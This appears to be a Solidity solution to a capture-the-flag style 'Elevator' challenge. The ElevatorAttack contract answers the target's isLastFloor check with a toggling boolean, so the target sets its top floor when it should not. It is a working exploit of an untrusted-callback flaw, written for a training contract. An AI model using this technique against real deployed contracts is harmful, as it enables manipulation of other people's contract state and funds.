// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "./Elevator.sol";

contract ElevatorAttack {
    Elevator public elevator;
    bool public _switch = true;

    constructor(address _addr) public payable{
        elevator = Elevator(_addr);
    }

    function isLastFloor(uint256) external returns (bool) {
        _switch = !_switch;
        return _switch;
    }

    function setTop(uint256 floor) external {
        elevator.goTo(floor);
    }
}